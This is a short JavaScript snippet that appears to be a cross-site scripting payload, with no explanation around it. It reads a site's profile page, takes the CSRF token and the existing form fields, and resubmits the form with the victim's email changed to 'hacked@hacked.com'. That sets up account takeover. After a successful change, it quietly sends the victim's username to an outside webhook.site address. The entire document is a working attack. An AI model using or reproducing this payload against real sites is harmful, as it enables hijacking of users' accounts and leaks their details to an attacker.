fetch('/profile')
  .then(response => response.text())
  .then(html => {
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');

    const csrfToken = doc.querySelector('input[name="csrf_token"]').value;

    const params = new URLSearchParams();
    params.append('csrf_token', csrfToken);
    params.append('username', doc.querySelector('input[name="username"]').value);
    params.append('firstname', doc.querySelector('input[name="firstname"]').value);
    params.append('lastname', doc.querySelector('input[name="lastname"]').value);
    params.append('email', 'hacked@hacked.com');


    return fetch('/profile', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: params.toString()
    }).then(res => {
      if (res.ok) {
        // Defer side-effect completely out of the resolution path
        setTimeout(() => {
          fetch(
            'https://webhook.site/557a412f-f375-41c9-b27f-a1ec11ea0df5?sucess=true&username=' + params.get('username'),
            { mode: 'no-cors' }
          ).catch(() => {});
        }, 0);
      }
      return res;
    });
  })
